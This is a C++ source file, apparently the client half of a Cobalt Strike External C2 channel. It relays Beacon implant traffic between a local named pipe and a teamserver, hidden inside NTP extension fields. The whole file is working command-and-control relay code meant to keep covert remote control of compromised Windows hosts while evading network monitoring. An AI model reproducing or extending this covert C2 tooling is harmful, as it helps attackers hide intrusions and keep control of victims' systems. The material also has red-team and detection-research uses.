// =====================================
// pipe stuff
// =====================================

#include <windows.h>
#include <iostream>
#include <vector>
#include "helpers.hpp"
#include "net.hpp"
#include "constants.hpp"
DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;

	if (!ReadFile(my_handle, (char*)&size, 4, &temp, NULL)) {
		//std::cerr << "Failed to read frame size. Error: " << GetLastError() << std::endl;
		return 0;
	}

	if (temp != 4) {
		//std::cerr << "Expected 4 bytes for size, got " << temp << std::endl;
		return 0;
	}

	//std::cout << "Frame size: " << size << std::endl;

	if (size > max) {
		//std::cerr << "Frame size " << size << " exceeds buffer max " << max << std::endl;
		return 0;
	}

	while (total < size) {
		if (!ReadFile(my_handle, buffer + total, size - total, &temp, NULL)) {
			//std::cerr << "ReadFile failed while reading frame data. Error: " << GetLastError() << std::endl;
			return 0;
		}

		if (temp == 0) {
			////std::cerr << "Pipe closed before reading complete frame." << std::endl;
			break;
		}

		total += temp;
	}

	return size;
}

void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}

void pipeLoop(std::vector<uint8_t> clientId) {
	//again pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c
	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
	while (handle_beacon == INVALID_HANDLE_VALUE) {
		//std::cout << "[+] Waiting on pipe to be available..." << std::endl;
		Sleep(1000);

		std::string full_pipe_path = "\\\\.\\pipe\\" + Beacon::pipeName;

		handle_beacon = CreateFileA(full_pipe_path.c_str(), GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
	}

	/* setup our buffer */
	char* buffer = (char*)malloc(Beacon::bufferMaxSize); 

	/*
	 * relay frames back and forth
	 */
	while (TRUE) {
		//maybe add a pipe cehck to make sure the pipe exists

		/* read from our named pipe Beacon */
		//std::cout << "[?] Attempting to read frame from Pipe" << std::endl;
		DWORD read = read_frame(handle_beacon, buffer, Beacon::bufferMaxSize);
		if (read < 0) {
			//std::cout << "Error reading from pipe" << std::endl;
			return;
		}
		//std::cout << "Read " << read << " bytes from pipe " << std::endl;
		////std::cout << "buffer contents:" << std::endl;
		//for (size_t i = 0; i < read; ++i) {
		//	printf("%02X ", buffer[i]);
		//}
		//printf("\n");

		// Create a vector from the char* data as the NTP class needs it, readis how much data was read. 
		std::vector<uint8_t> vec(buffer, buffer + read);

		//std::cout << "Data from Pipe: ";
		//printHexVector(vec);
		//std::cout << std::endl;

		//send with chunker
		sendBeaconDataToTeamserver(
			vec,
			NtpExtensionField::dataForTeamserver,
			clientId
		);
		//std::cout << "[?] Data sent to teamserver" << std::endl;

		//then need to getBeaconDataFromTeamserver (which will ask the server for the data for this client)
		//std::cout << "[?] Getting data back from Teamserver" << std::endl;
		std::vector<uint8_t> dataFromTeamserver = getBeaconDataFromTeamserver(
			clientId
		);

		//std::cout << "[?] Data being written to pipe: ";
		//printHexVector(dataFromTeamserver);
		//std::cout << std::endl;

		//convert to char * as that's what write_frame wants
		char* dataForBeacon = reinterpret_cast<char*>(dataFromTeamserver.data());

		/* write to our named pipe Beacon */
		//write_frame(handle_beacon, dataForBeacon, read);
		write_frame(handle_beacon, dataForBeacon, dataFromTeamserver.size());

		//sleep & wait for beacon to do something
		Sleep(Client::beaconSleepTimeMs);
		//exit after comms
	}
}
